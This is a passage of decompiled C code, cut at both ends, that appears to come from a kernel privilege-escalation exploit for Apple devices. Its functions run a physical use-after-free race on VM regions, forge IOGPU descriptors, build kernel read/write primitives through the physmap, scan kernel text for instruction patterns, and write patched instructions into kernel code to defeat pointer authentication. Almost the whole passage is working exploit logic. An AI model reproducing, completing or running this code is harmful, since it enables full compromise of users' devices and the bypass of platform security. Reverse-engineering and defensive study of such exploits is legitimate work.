  *(uint64_t *)(a1 + 1424) = v3;
  v9 = (int (__cdecl *)(const void *, const void *))nullsub_1(compare_entry_by_offset);
  qsort((void *)(a1 + 56), 0x40u, 0x10u, v9);
  free(*(void **)(a1 + 48));
  *(uint64_t *)(a1 + 48) = 0;
}
// 8694: variable 'v7' is possibly undefined
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (0000000000008710) ----------------------------------------------------
void __fastcall run_physmap_setup_sequence(uint64_t *a1)
{

  run_physmap_worker_threads((__int64)a1);
  puaf_vmregion_race_trigger(a1);
  puaf_vm_region_scan_1((__int64)a1);
  validate_physmap_range_2((__int64)a1);
}
// 8748: variable 'vars8' is possibly undefined

//----- (0000000000008758) ----------------------------------------------------
__int64 __fastcall validate_physmap_range_3(vm_address_t *a1)
{
  vm_address_t scratch;
  vm_address_t copyDst;
  vm_address_t remapBase;
  vm_address_t sourceBase;
  vm_address_t selectedChunk;
  vm_address_t selectedPhys;
  vm_address_t keepStart;
  vm_size_t keepTailSize;
  uint8_t repeatDesc[0x100];
  uint8_t topDesc[0x100];
  uint8_t middleDesc[0x100];
  uint8_t tailDesc[0x30];

  scratch = 0;
  vm_allocate(mach_task_self_, &scratch, 0xC000u, 1);
  a1[176] = scratch;
  a1[172] = scratch;
  vm_allocate(mach_task_self_, &scratch, 0x4000u, 0x4000);
  thread_switch(0, 2, 0);
  vm_deallocate(mach_task_self_, a1[7], 0x4000u);
  a1[7] = 0;
  vm_remap_inplace(a1[172], 0x4000u, 0);
  query_vm_region_nesting(a1[172]);

  scratch = 0;
  vm_allocate(mach_task_self_, &scratch, 0x10000u, 1);
  a1[175] = scratch;
  vm_allocate(mach_task_self_, &scratch, 0x4000u, 16386);
  vm_remap_inplace(a1[175], 0x4000u, 0);
  scratch = a1[175] + 0x4000;
  copyDst = scratch;
  vm_allocate(mach_task_self_, &scratch, 0x4000u, 0x4000);
  thread_switch(0, 2, 0);
  vm_deallocate(mach_task_self_, a1[9], 0x4000u);
  a1[9] = 0;
  vm_copy(mach_task_self_, a1[172], 0xC000u, copyDst);
  query_vm_region_nesting(copyDst);
  vm_deallocate(mach_task_self_, a1[175] + 49152, 0x4000u);
  scratch = a1[172] + 0x4000;
  remapBase = scratch;
  vm_allocate(mach_task_self_, &scratch, 0x4000u, 16386);
  vm_remap_inplace(remapBase, 0x4000u, 0);

  scratch = 0;
  vm_allocate(mach_task_self_, &scratch, 0xC000u, 1);
  a1[173] = scratch;
  vm_allocate(mach_task_self_, &scratch, 0x4000u, 16386);
  vm_remap_inplace(a1[173], 0x4000u, 0);
  scratch = a1[173] + 0x4000;
  remapBase = scratch;
  vm_allocate(mach_task_self_, &scratch, 0x4000u, 16386);
  vm_remap_inplace(remapBase, 0x4000u, 0);

  vm_copy(mach_task_self_, a1[139], a1[140], a1[138]);
  selectedChunk = -1;
  if ( a1[140] )
  {
    for ( vm_address_t offset = 0; offset < a1[140]; offset += 0x4000 )
    {
      vm_address_t chunk = a1[138] + offset;
      if ( (*(uint8_t *)(chunk + 127) & 1) == 0 && (*(uint8_t *)(chunk + 383) & 1) == 0 )
      {
        a1[163] = *(uint64_t *)(chunk + 328);
        selectedChunk = offset;
      }
    }
  }

  scratch = 0;
  vm_allocate(mach_task_self_, &scratch, 0xC000u, 1);
  a1[169] = scratch;
  vm_allocate(mach_task_self_, &scratch, 0x4000u, 16386);
  vm_remap_inplace(a1[169], 0x4000u, 0);
  scratch = a1[169] + 0x4000;
  vm_allocate(mach_task_self_, &scratch, 0x8000u, 0x4000);

  a1[170] = a1[139] + selectedChunk;
  scratch = a1[170] + 0x4000;
  vm_allocate(mach_task_self_, &scratch, 0x8000u, 0x4000);
  sourceBase = a1[139];
  keepStart = a1[170];
  keepTailSize = sourceBase + a1[140] - keepStart - 0x4000;
  vm_deallocate(mach_task_self_, sourceBase, keepStart - sourceBase);
  vm_deallocate(mach_task_self_, keepStart + 0xC000, keepTailSize);
  vm_deallocate(mach_task_self_, a1[138], a1[140]);
  a1[138] = 0;
  a1[139] = 0;

  memset(repeatDesc, 0, sizeof(repeatDesc));
  memcpy(repeatDesc + 8, byte_42D30, 16);
  iogpu_desc_store32(repeatDesc, 40, 100);
  iogpu_desc_store32(repeatDesc, 112, 4);
  iogpu_desc_store32(repeatDesc, 124, 16893952);
  iogpu_desc_store64(repeatDesc, 152, -1ULL);
  iogpu_desc_store32(repeatDesc, 172, 786560);
  for ( size_t offset = 0; offset < 0x4000; offset += sizeof(repeatDesc) )
    memcpy((void *)(a1[169] + offset), repeatDesc, sizeof(repeatDesc));

  vm_copy(mach_task_self_, a1[169], 0xC000u, a1[170]);
  for ( size_t index = 0; index != 124; index += 2 )
  {
    vm_deallocate(mach_task_self_, a1[11 + index], 0x4000u);
    a1[11 + index] = 0;
  }

  bzero((void *)a1[169], 0x4000u);

  selectedPhys = a1[163];
  memset(topDesc, 0, sizeof(topDesc));
  uint32_t topPageIndex = (selectedPhys + 0x2400000200LL) >> 6;
  if ( selectedPhys == -512 )
    topPageIndex = 0;
  iogpu_desc_store32(topDesc, 0, topPageIndex);
  iogpu_desc_store32(topDesc, 4, topPageIndex);
  memcpy(topDesc + 8, byte_42D30, 16);
  iogpu_desc_store64(topDesc, 24, 0x4000);
  iogpu_desc_store64(topDesc, 32, selectedPhys + 512);
  iogpu_desc_store64(topDesc, 40, 0x100000064LL);
  iogpu_desc_store32(topDesc, 48, 1);
  iogpu_desc_store32(topDesc, 124, 1165312);
  iogpu_desc_store64(topDesc, 152, -1ULL);
  iogpu_desc_store32(topDesc, 172, 786439);
  iogpu_desc_store64(topDesc, 184, selectedPhys + 184);
  iogpu_desc_store64(topDesc, 192, selectedPhys + 184);

  memset(middleDesc, 0, sizeof(middleDesc));
  uint32_t middlePageIndex = (selectedPhys + 0x2400000100LL) >> 6;
  if ( selectedPhys == -256 )
    middlePageIndex = 0;
  iogpu_desc_store32(middleDesc, 0, middlePageIndex);
  iogpu_desc_store32(middleDesc, 4, middlePageIndex);
  memcpy(middleDesc + 8, byte_42D30, 16);
  iogpu_desc_store64(middleDesc, 24, 0x4000);
  iogpu_desc_store64(middleDesc, 40, 100);
  iogpu_desc_store32(middleDesc, 112, 4);
  iogpu_desc_store32(middleDesc, 124, 100352);
  iogpu_desc_store64(middleDesc, 152, -1ULL);
  iogpu_desc_store32(middleDesc, 172, 786439);
  iogpu_desc_store64(middleDesc, 184, selectedPhys + 3200);
  iogpu_desc_store64(middleDesc, 192, selectedPhys + 3200);

  memset(tailDesc, 0, sizeof(tailDesc));
  uint32_t tailPageIndex;
  if ( selectedPhys )
    tailPageIndex = (selectedPhys + 0x2400000000LL) >> 6;
  else
    tailPageIndex = 0;
  iogpu_desc_store32(tailDesc, 8, tailPageIndex);
  iogpu_desc_store32(tailDesc, 12, tailPageIndex);
  iogpu_desc_store64(tailDesc, 32, tailPageIndex | 0x401000100000000LL);
  iogpu_desc_store32(tailDesc, 44, 4108);

  memcpy((void *)a1[169], topDesc, sizeof(topDesc));
  memcpy((void *)(a1[169] + 0x100), middleDesc, sizeof(middleDesc));
  memcpy((void *)(a1[169] + 0x200), tailDesc, sizeof(tailDesc));
  return vm_copy(mach_task_self_, a1[169], 0xC000u, a1[170]);
}
// 42D30: using guessed type __int128 xmmword_42D30;

//----- (0000000000008DDC) ----------------------------------------------------
void __fastcall scan_physmap_overlap(uint64_t *a1, __int64 a2, unsigned __int64 *a3, unsigned __int64 *a4)
{
  char *v8; // x21
  __int64 v9; // x23
  unsigned __int64 v10; // x0
  unsigned __int64 v11; // x8
  unsigned __int64 v12; // x9
  unsigned __int64 v13; // x9
  unsigned __int64 v14; // x8
  char *v15; // x9
  unsigned __int64 v16; // x12

  v8 = (char *)malloc(0x4000u);
  v9 = -(__int64)vm_page_size & a2;
  if ( v9 )
  {
    while ( 1 )
    {
      v10 = build_physmap_page_table(a1, v9);
      if ( v10 )
        break;
LABEL_6:
      v9 -= 0x4000;
      if ( !v9 )
        goto LABEL_7;
    }
    physmap_read_aligned(a1, v10, v8, 0x4000u);
    v11 = 0;
    while ( *(uint32_t *)&v8[v11] != -1459454112 )
    {
      v12 = v11 >> 3;
      v11 += 4LL;
      if ( v12 >= 0x7FF )
        goto LABEL_6;
    }
    v15 = &v8[v11];
    v16 = v9 + v11;
    v14 = ((v9 + v11 + 12) & 0xFFFFFFFFFFFFF000LL)
        + (((unsigned __int64)*(unsigned int *)&v8[v11 + 16] >> 7) & 0x7FF8)
        + 2LL * (((*(uint32_t *)&v8[v11 + 12] >> 18) & 0x1800) | (*(uint32_t *)&v8[v11 + 12] >> 5 << 13));
    v13 = ((v16 - 20) & 0xFFFFFFFFFFFFF000LL)
        + (((unsigned __int64)*((unsigned int *)v15 - 4) >> 7) & 0x7FF8)
        + 2LL * (((*((uint32_t *)v15 - 5) >> 18) & 0x1800) | (*((uint32_t *)v15 - 5) >> 5 << 13));
  }
  else
  {
LABEL_7:
    v13 = 0;
    v14 = 0;
  }
  *a3 = v14;
  *a4 = v13;
  free(v8);
}
// 8F08: variable 'vars8' is possibly undefined

//----- (0000000000008F18) ----------------------------------------------------
void __fastcall scan_physmap_addr_range(uint64_t *a1, __int64 a2, int a3, uint64_t *a4)
{
  char *v8; // x21
  unsigned __int64 v9; // x24
  __int64 v10; // x22
  unsigned __int64 v11; // x25
  __int64 v12; // x23
  unsigned __int64 v13; // x8
  unsigned __int64 v14; // x9
  unsigned __int64 v15; // x8

  v8 = (char *)malloc(0x4000u);
  if ( a2 == 0x10000000000LL )
    v9 = 0xFFFF800000000000LL;
  else
    v9 = 0xFFFFFF8000000000LL;
  v10 = (unsigned int)(a3 << 14) + a2;
  v11 = 50331648;
  v12 = v10 + 50331648;
  while ( 2 )
  {
    physmap_read_aligned(a1, (v10 + v11) & -(__int64)vm_page_size, v8, 0x4000u);
    v13 = 0;
    do
    {
      if ( *(uint64_t *)&v8[v13 + 16] == v9 && *(uint64_t *)&v8[v13 + 24] == -1 )
      {
        *a4 = v12 + v13;
        goto LABEL_12;
      }
      v14 = v13 >> 3;
      v13 += 8LL;
    }
    while ( v14 < 0x7E3 );
    v15 = v11 >> 14;
    v11 += 0x4000LL;
    v12 += 0x4000;
    if ( v15 < 0xFFF )
      continue;
    break;
  }
LABEL_12:
  free(v8);
}
// 9008: variable 'vars8' is possibly undefined

//----- (0000000000009018) ----------------------------------------------------
void *__fastcall setup_physmap_copy_structure(uint64_t *a1)
{
  void *result; // x0
  uint64_t previousOverlapPte; // [xsp+0h] [xbp-200h] BYREF
  uint64_t nextOverlapPte; // [xsp+8h] [xbp-1F8h] BYREF
  unsigned __int64 previousOverlapAddr; // [xsp+10h] [xbp-1F0h] BYREF
  unsigned __int64 nextOverlapAddr; // [xsp+18h] [xbp-1E8h] BYREF
  uint8_t iogpuDesc[0xE0]; // [xsp+20h] [xbp-1E0h] BYREF
  uint8_t physmapDesc[0xE0]; // [xsp+100h] [xbp-100h] BYREF
  unsigned __int64 physmapDescAddr; // [xsp+1E0h] [xbp-20h] BYREF
  uint32_t physmapRangeIndex; // [xsp+1ECh] [xbp-14h] BYREF

  physmapRangeIndex = 0;
  physmap_read_dword(a1, a1[181], &physmapRangeIndex);
  physmapDescAddr = 0;
  scan_physmap_addr_range(a1, a1[180], physmapRangeIndex, &physmapDescAddr);
  memset(physmapDesc, 0, sizeof(physmapDesc));
  physmap_read_aligned(a1, physmapDescAddr, physmapDesc, sizeof(physmapDesc));
  __int16 iogpuDescriptorId = *(int16_t *)&physmapDesc[0x40];
  a1[164] = *(uint64_t *)&physmapDesc[0x08];
  a1[165] = a1[182];
  memset(iogpuDesc, 0, sizeof(iogpuDesc));
  iogpu_kread_loop(a1, iogpuDescriptorId, (char *)iogpuDesc, sizeof(iogpuDesc));
  uint64_t iogpuObjectAddr = *(uint64_t *)&iogpuDesc[0x48];
  a1[166] = iogpuObjectAddr;

  previousOverlapAddr = 0;
  nextOverlapAddr = 0;
  scan_physmap_overlap(a1, iogpuObjectAddr, &nextOverlapAddr, &previousOverlapAddr);
  nextOverlapPte = 0;
  physmap_read_aligned(a1, build_physmap_page_table(a1, nextOverlapAddr), &nextOverlapPte, 8u);
  a1[167] = nextOverlapPte;
  previousOverlapPte = 0;
  result = physmap_read_aligned(a1, build_physmap_page_table(a1, previousOverlapAddr), &previousOverlapPte, 8u);
  a1[168] = previousOverlapPte;
  return result;
}

//----- (0000000000009150) ----------------------------------------------------
__int64 __fastcall reset_physmap_copy_area(__int64 a1)
{
  vm_size_t v2; // x2
  __int64 result; // x0
  vm_address_t address; // [xsp+8h] [xbp-18h] BYREF

  vm_deallocate(mach_task_self_, *(uint64_t *)(a1 + 1080), *(uint64_t *)(a1 + 1096));
  *(uint64_t *)(a1 + 1080) = 0;
  (*(void (__fastcall **)(uint64_t, uint64_t))(a1 + 1464))(*(uint64_t *)(a1 + 1488), *(uint64_t *)(a1 + 1088));
  v2 = *(uint64_t *)(a1 + 1096);
  address = *(uint64_t *)(a1 + 1088);
  vm_allocate(mach_task_self_, &address, v2, 0x4000);
  **(uint8_t **)(a1 + 1088) = 65;
  result = vm_deallocate(mach_task_self_, *(uint64_t *)(a1 + 1088), *(uint64_t *)(a1 + 1096));
  *(uint64_t *)(a1 + 1088) = 0;
  return result;
}

//----- (00000000000091E0) ----------------------------------------------------
__int64 __fastcall dealloc_krw_port_array(__int64 result, __int64 a2)
{
  __int64 v3; // x20
  unsigned __int64 v4; // x21
  __int64 v5; // x22

  v3 = result;
  v4 = 0;
  v5 = a2 + 20;
  do
  {
    if ( v4 < *(uint64_t *)(a2 + 32) )
    {
      (*(void (__fastcall **)(uint64_t, uint64_t))(v3 + 1472))(*(uint64_t *)(v3 + 1488), *(unsigned int *)(v5 + 4 * v4));
      result = mach_port_deallocate(mach_task_self_, *(uint32_t *)(v5 + 4 * v4));
      *(uint32_t *)(v5 + 4 * v4) = 0;
    }
    ++v4;
  }
  while ( v4 != 3 );
  return result;
}

//----- (000000000000925C) ----------------------------------------------------
void __fastcall cleanup_physmap_copy_entries(__int64 a1)
{
  __int64 v2; // x22
  __int64 v3; // x25
  __int64 v4; // x23
  uint64_t *v5; // x20
  __int64 v6; // x27
  char v7; // w8
  char v8; // w21
  vm_address_t *v9; // x20
  uint64_t v11[2]; // [xsp+8h] [xbp-68h]

  v2 = 0;
  v3 = a1 + 1128;
  v4 = a1 + 1168;
  v11[0] = a1 + 1128;
  v11[1] = a1 + 1168;
  while ( 1 )
  {
    while ( 1 )
    {
      v5 = *(uint64_t **)(v3 + 24);
      if ( !v5 )
        break;
      *(uint64_t *)(v3 + 24) = *v5;
      (*(void (__fastcall **)(uint64_t, uint64_t))(a1 + 1464))(*(uint64_t *)(a1 + 1488), v5[3]);
      vm_deallocate(mach_task_self_, v5[3], 0x4000u);
      v5[3] = 0;
      dealloc_krw_port_array(a1, (__int64)(v5 + 2));
      free(v5);
    }
    v6 = 0;
    v7 = 1;
    do
    {
      v8 = v7;
      v9 = *(vm_address_t **)(v3 + 8 * v6);
      dealloc_krw_port_array(a1, (__int64)(v9 + 2));
      if ( v6 != *(uint64_t *)(v3 + 16) || v3 == v4 )
      {
        (*(void (__fastcall **)(uint64_t, vm_address_t))(a1 + 1464))(*(uint64_t *)(a1 + 1488), v9[7]);
        vm_deallocate(mach_task_self_, v9[7], 0xC000u);
      }
      free(v9);
      v7 = 0;
      v6 = 1;
    }
    while ( (v8 & 1) != 0 );
    if ( ++v2 == 2 )
      break;
    v3 = v11[v2];
  }
}

//----- (00000000000093B0) ----------------------------------------------------
__int64 __fastcall dealloc_physmap_copy_slot(__int64 a1, __int64 a2)
{
  __int64 result; // x0

  (*(void (__fastcall **)(uint64_t, uint64_t))(a1 + 1464))(*(uint64_t *)(a1 + 1488), *(uint64_t *)(a2 + 24));
  vm_deallocate(mach_task_self_, *(uint64_t *)(a2 + 24), 0x4000u);
  *(uint64_t *)(a2 + 24) = 0;
  result = vm_deallocate(mach_task_self_, *(uint64_t *)(a2 + 136), 0x18000u);
  *(uint64_t *)(a2 + 136) = 0;
  return result;
}

//----- (0000000000009410) ----------------------------------------------------
__int64 __fastcall dealloc_physmap_2page_slot(__int64 a1, vm_address_t *a2)
{
  __int64 result; // x0

  (*(void (__fastcall **)(uint64_t, vm_address_t))(a1 + 1464))(*(uint64_t *)(a1 + 1488), a2[3]);
  (*(void (__fastcall **)(uint64_t, vm_address_t))(a1 + 1464))(*(uint64_t *)(a1 + 1488), a2[8]);
  vm_deallocate(mach_task_self_, a2[3], 0x4000u);
  a2[3] = 0;
  vm_deallocate(mach_task_self_, a2[8], 0x4000u);
  a2[8] = 0;
  vm_deallocate(mach_task_self_, a2[17], 0x18000u);
  a2[17] = 0;
  result = vm_deallocate(mach_task_self_, a2[18], 0x14000u);
  a2[18] = 0;
  return result;
}

//----- (00000000000094B0) ----------------------------------------------------
__int64 __fastcall dealloc_physmap_3page_slot(__int64 a1, vm_address_t *a2)
{
  __int64 result; // x0

  (*(void (__fastcall **)(uint64_t, vm_address_t))(a1 + 1464))(*(uint64_t *)(a1 + 1488), a2[3]);
  (*(void (__fastcall **)(uint64_t, vm_address_t))(a1 + 1464))(*(uint64_t *)(a1 + 1488), a2[8]);
  (*(void (__fastcall **)(uint64_t, vm_address_t))(a1 + 1464))(*(uint64_t *)(a1 + 1488), a2[13]);
  vm_deallocate(mach_task_self_, a2[3], 0x4000u);
  a2[3] = 0;
  vm_deallocate(mach_task_self_, a2[8], 0x4000u);
  a2[8] = 0;
  vm_deallocate(mach_task_self_, a2[13], 0x4000u);
  a2[13] = 0;
  vm_deallocate(mach_task_self_, a2[17], 0x18000u);
  a2[17] = 0;
  vm_deallocate(mach_task_self_, a2[18], 0x14000u);
  a2[18] = 0;
  result = vm_deallocate(mach_task_self_, a2[19], 0x10000u);
  a2[19] = 0;
  return result;
}

//----- (0000000000009588) ----------------------------------------------------
__int64 __fastcall dealloc_iogpu_physmap_2(__int64 a1, uint64_t *a2)
{
  __int64 iogpuCtx; // x20
  __int64 descOffset; // x21
  __int64 result; // x0

  iogpuCtx = *(uint64_t *)(a1 + 1488);
  (*(void (__fastcall **)(__int64, uint64_t))(a1 + 1464))(iogpuCtx, a2[8]);
  (*(void (__fastcall **)(uint64_t, uint64_t))(a1 + 1464))(*(uint64_t *)(a1 + 1488), a2[13]);
  vm_deallocate(mach_task_self_, a2[8], 0x4000u);
  a2[8] = 0;
  vm_deallocate(mach_task_self_, a2[13], 0x4000u);
  a2[13] = 0;
  descOffset = a2[7] - *(uint64_t *)(a1 + 1344);
  iogpu_patch_descriptor64(iogpuCtx, descOffset, 72, 0);
  vm_deallocate(mach_task_self_, a2[20], 0x10000u);
  a2[20] = 0;
  vm_deallocate(mach_task_self_, a2[21], 0x10000u);
  a2[21] = 0;
  vm_deallocate(mach_task_self_, a2[22], 0x10000u);
  a2[22] = 0;
  result = vm_deallocate(mach_task_self_, a2[23], 0x10000u);
  a2[23] = 0;
  return result;
}

//----- (00000000000096D8) ----------------------------------------------------
__int64 __fastcall dealloc_iogpu_physmap_entry(__int64 a1, uint64_t *a2)
{
  __int64 iogpuCtx; // x20
  __int64 physBase; // x9
  __int64 firstDescOffset; // x22
  __int64 secondDescOffset; // x21
  __int64 result; // x0

  iogpuCtx = *(uint64_t *)(a1 + 1488);
  (*(void (__fastcall **)(__int64, uint64_t))(a1 + 1464))(iogpuCtx, a2[13]);
  vm_deallocate(mach_task_self_, a2[13], 0x4000u);
  a2[13] = 0;
  physBase = *(uint64_t *)(a1 + 1344);
  firstDescOffset = a2[2] - physBase;
  secondDescOffset = a2[12] - physBase;
  iogpu_patch_descriptor32(iogpuCtx, firstDescOffset, 40, 3);
  iogpu_patch_descriptor64(iogpuCtx, secondDescOffset, 72, 0);
  vm_deallocate(mach_task_self_, a2[20], 0x4000u);
  a2[20] = 0;
  vm_deallocate(mach_task_self_, a2[21], 0x10000u);
  a2[21] = 0;
  vm_deallocate(mach_task_self_, a2[22], 0x10000u);
  a2[22] = 0;
  vm_deallocate(mach_task_self_, a2[23], 0x10000u);
  a2[23] = 0;
  vm_deallocate(mach_task_self_, a2[24], 0x10000u);
  a2[24] = 0;
  result = vm_deallocate(mach_task_self_, a2[25], 0x10000u);
  a2[25] = 0;
  return result;
}

//----- (00000000000098A4) ----------------------------------------------------
__int64 __fastcall dealloc_iogpu_physmap_triple(__int64 a1, uint64_t *a2)
{
  __int64 iogpuCtx; // x20
  __int64 physBase; // x9
  __int64 firstDescOffset; // x23
  __int64 secondDescOffset; // x22
  __int64 thirdDescOffset; // x21
  __int64 result; // x0

  iogpuCtx = *(uint64_t *)(a1 + 1488);
  physBase = *(uint64_t *)(a1 + 1344);
  firstDescOffset = a2[2] - physBase;
  secondDescOffset = a2[7] - physBase;
  thirdDescOffset = a2[12] - physBase;
  iogpu_patch_descriptor64(iogpuCtx, firstDescOffset, 72, 0);
  iogpu_patch_descriptor64(iogpuCtx, secondDescOffset, 72, 0);
  iogpu_patch_descriptor64(iogpuCtx, thirdDescOffset, 72, 0);
  iogpu_patch_descriptor64(iogpuCtx, thirdDescOffset, 56, 0);
  vm_deallocate(mach_task_self_, a2[20], 0x4000u);
  a2[20] = 0;
  vm_deallocate(mach_task_self_, a2[26], 0x10000u);
  a2[26] = 0;
  vm_deallocate(mach_task_self_, a2[27], 0x10000u);
  a2[27] = 0;
  vm_deallocate(mach_task_self_, a2[28], 0x10000u);
  a2[28] = 0;
  result = vm_deallocate(mach_task_self_, a2[29], 0x10000u);
  a2[29] = 0;
  return result;
}

//----- (0000000000009AC0) ----------------------------------------------------
void __fastcall cleanup_physmap_context(__int64 a1)
{
  __int64 iogpuCtx = *(uint64_t *)(a1 + 1488);
  vm_address_t **listHeads[2] = {
    (vm_address_t **)(a1 + 1208),
    (vm_address_t **)(a1 + 1240),
  };

  for ( size_t listIndex = 0; listIndex < 2; ++listIndex )
  {
    vm_address_t **list = listHeads[listIndex];
    vm_address_t *entry;

    while ( (entry = list[1]) != 0 )
    {
      list[1] = (vm_address_t *)*entry;
      switch ( entry[1] )
      {
        case 1uLL:
          dealloc_physmap_copy_slot(a1, (__int64)entry);
          break;
        case 2uLL:
          dealloc_physmap_2page_slot(a1, entry);
          break;
        case 3uLL:
          dealloc_physmap_3page_slot(a1, entry);
          break;
        case 4uLL:
          dealloc_iogpu_physmap_2(a1, entry);
          break;
        case 5uLL:
          dealloc_iogpu_physmap_entry(a1, entry);
          break;
        case 6uLL:
          dealloc_iogpu_physmap_triple(a1, entry);
          break;
        default:
          break;
      }
      dealloc_krw_port_array(a1, (__int64)(entry + 2));
      dealloc_krw_port_array(a1, (__int64)(entry + 7));
      dealloc_krw_port_array(a1, (__int64)(entry + 12));
      free(entry);
    }

    vm_address_t *root = *list;
    uint64_t *rootPorts0 = root + 2;
    uint64_t *rootPorts1 = root + 7;
    uint64_t *rootPorts2 = root + 12;
    __int64 physBase = *(uint64_t *)(a1 + 1344);
    __int64 firstDescOffset = *rootPorts0 - physBase;
    __int64 secondDescOffset = *rootPorts1 - physBase;
    __int64 thirdDescOffset = *rootPorts2 - physBase;

    iogpu_patch_descriptor64(iogpuCtx, firstDescOffset, 72, 0);
    iogpu_patch_descriptor64(iogpuCtx, secondDescOffset, 72, 0);
    iogpu_patch_descriptor64(iogpuCtx, thirdDescOffset, 72, 0);
    iogpu_patch_descriptor64(iogpuCtx, thirdDescOffset, 56, 0);
    if ( list == listHeads[1] )
    {
      __int64 objectDescOffset = query_vm_region_nesting(root[26]).object_id - physBase;
      iogpu_patch_descriptor32(iogpuCtx, objectDescOffset, 40, 2);
    }

    vm_deallocate(mach_task_self_, root[28], 0x10000u);
    root[28] = 0;
    vm_deallocate(mach_task_self_, root[29], 0x10000u);
    root[29] = 0;
    vm_address_t *lastMapping;
    if ( list == listHeads[0] )
    {
      vm_deallocate(mach_task_self_, root[26], 0x10000u);
      root[26] = 0;
      vm_deallocate(mach_task_self_, root[27], 0x10000u);
      root[27] = 0;
      vm_deallocate(mach_task_self_, root[30], 0xC000u);
      root[30] = 0;
      lastMapping = root + 31;
    }
    else
    {
      vm_deallocate(mach_task_self_, root[26], 0xC000u);
      root[26] = 0;
      lastMapping = root + 27;
    }
    vm_deallocate(mach_task_self_, *lastMapping, 0xC000u);
    *lastMapping = 0;
    dealloc_krw_port_array(a1, (__int64)rootPorts0);
    dealloc_krw_port_array(a1, (__int64)rootPorts1);
    dealloc_krw_port_array(a1, (__int64)rootPorts2);
    free(root);
  }
}

//----- (0000000000009F4C) ----------------------------------------------------
__int64 __fastcall free_vm_page_array_list(__int64 a1)
{
  uint64_t *v2; // x0
  __int64 (__fastcall *v3)(__int64, __int64); // x2
  __int64 v4; // x0
  __int64 v5; // x1

  v2 = *(uint64_t **)a1;
  if ( v2 )
  {
    do
    {
      *(uint64_t *)a1 = *v2;
      deallocate_physmap_pages((__int64)v2);
      v2 = *(uint64_t **)a1;
    }
    while ( *(uint64_t *)a1 );
  }
  vm_deallocate(mach_task_self_, *(uint64_t *)(a1 + 32), (*(uint64_t *)(a1 + 1432) << 14) + 49152LL);
  *(uint64_t *)(a1 + 32) = 0;
  reset_physmap_copy_area(a1);
  cleanup_physmap_copy_entries(a1);
  cleanup_physmap_context(a1);
  atomic_load((unsigned __int8 *)(a1 + 1280));
  atomic_load((unsigned __int8 *)(a1 + 1296));
  v3 = *(__int64 (__fastcall **)(__int64, __int64))(a1 + 1480);
  v4 = *(uint64_t *)(a1 + 1488);
  v5 = *(uint64_t *)(a1 + 1360);
  return v3(v4, v5);
}
// 9FE0: variable 'vars8' is possibly undefined

//----- (0000000000009FF0) ----------------------------------------------------
void __fastcall teardown_iogpu_vm_copy(vm_address_t *a1)
{

  a1[176] = 0;
  vm_deallocate(mach_task_self_, a1[169], 0xC000u);
  a1[169] = 0;
  vm_deallocate(mach_task_self_, a1[170], 0xC000u);
  a1[170] = 0;
  vm_deallocate(mach_task_self_, a1[172], 0xC000u);
  a1[172] = 0;
  vm_deallocate(mach_task_self_, a1[173], 0xC000u);
  a1[173] = 0;
  vm_deallocate(mach_task_self_, a1[175], 0xC000u);
  a1[175] = 0;
  bzero(a1, 0x5E8u);
  free(a1);
}
// A090: variable 'vars8' is possibly undefined

//----- (000000000000A0A0) ----------------------------------------------------
__int64 __fastcall necp_send_msg_1(struct_krwCtx *krwCtx)
{
  uint64_t textRange[3]; // [xsp+0h] [xbp-A0h] BYREF
  uint64_t textRange2[3]; // [xsp+18h] [xbp-88h] BYREF
  int doubledPatchCount; // [xsp+34h] [xbp-6Ch] BYREF
  unsigned __int64 patchedInstruction; // [xsp+38h] [xbp-68h] BYREF
  int headerMagic; // [xsp+40h] [xbp-60h] BYREF
  int patchCount; // [xsp+44h] [xbp-5Ch] BYREF
  __int64 dispatchTarget; // [xsp+48h] [xbp-58h] BYREF
  __int64 selfCheckValue; // [xsp+50h] [xbp-50h] BYREF
  __int64 dataPointer; // [xsp+58h] [xbp-48h] BYREF

  dataPointer = 0;
  dispatchTarget = 0;
  selfCheckValue = 0;

  macho_find_text_section(krwCtx->kernelMachoCtx, textRange2);

  // 08 3D 40 92: and x8, x8, #0xffff
  // 09 18 80 52: mov w9, #0xc0
  // This lands inside the kernel routine whose nearby literal/data slots drive
  // the vmcopy PAC-bypass notification path used below.
  __int64 maskPattern = kernel_pattern_scan((__int64)textRange2, "08 3D 40 92 09 18 80 52", 0);
  if ( !maskPattern )
    return 708625;

  unsigned __int64 ownerFunction = find_kernel_func_aligned((__int64 *)krwCtx->kernelMachoCtx, maskPattern + 8);
  if ( !ownerFunction )
    return 708625;

  unsigned __int64 selfCheckSlot = ownerFunction + 7104;
  if ( !kread_physmap_decorated(krwCtx, selfCheckSlot, (unsigned __int64 *)&selfCheckValue) )
    return 163855;
  if ( selfCheckSlot != selfCheckValue )
    return 163878;

  if ( !kread_physmap_decorated(krwCtx, ownerFunction + 7120, (unsigned __int64 *)&dataPointer) )
    return 163855;
  if ( (unsigned __int64)(dataPointer + 0x1000000000000LL) > 0xFFFFFFFFEFFELL )
    return 163878;

  if ( !(unsigned int)krw_read_thunk(krwCtx, dataPointer, 4, &headerMagic) )
    return 163855;
  if ( headerMagic != 1864396150 )
    return 163857;

  unsigned __int64 dispatchTargetSlot = ownerFunction + 7168;
  if ( !kread_physmap_decorated(krwCtx, dispatchTargetSlot, (unsigned __int64 *)&dispatchTarget) )
    return 163855;
  if ( validate_kaddr_range(krwCtx, dispatchTarget) )
    return 0;

  macho_find_text_section(krwCtx->kernelMachoCtx, textRange);

  // 1F 01 0A EB: cmp x8, x10
  // 41 00 00 54: b.ne +0x8
  // C0 03 5F D6: ret
  // The found function is patched briefly so the notification path resolves
  // the PAC-authenticated dispatch target, then the side effect is checked.
  __int64 retComparePattern =
    kernel_pattern_scan((__int64)textRange, "1F 01 0A EB 41 00 00 54 C0 03 5F D6 .. .. .. F9", 0);
  if ( !retComparePattern )
    return 708625;

  __int64 *patchFunction = (__int64 *)find_kernel_func((__int64 *)krwCtx->kernelMachoCtx, (__int64 *)(retComparePattern - 8));
  if ( !patchFunction )
    return 708625;

  __int64 patchCountSlot = ownerFunction + 7272;
  if ( !(unsigned int)krw_read_thunk(krwCtx, patchCountSlot, 4, &patchCount) )
    return 163855;
  if ( !patchCount )
    return 163857;

  doubledPatchCount = 2 * patchCount;
  __int64 patchGateSlot = ownerFunction + 7176;
  if ( !(unsigned int)kwrite_with_retry(krwCtx, patchGateSlot, (__int64)&doubledPatchCount, 4) )
    return 163856;

  patchedInstruction = macho_read_u64((__int64 *)krwCtx->kernelMachoCtx, patchFunction) + 52428;
  if ( !(unsigned int)kwrite_with_retry(krwCtx, (__int64)patchFunction, (__int64)&patchedInstruction, 4) )
    return 163856;

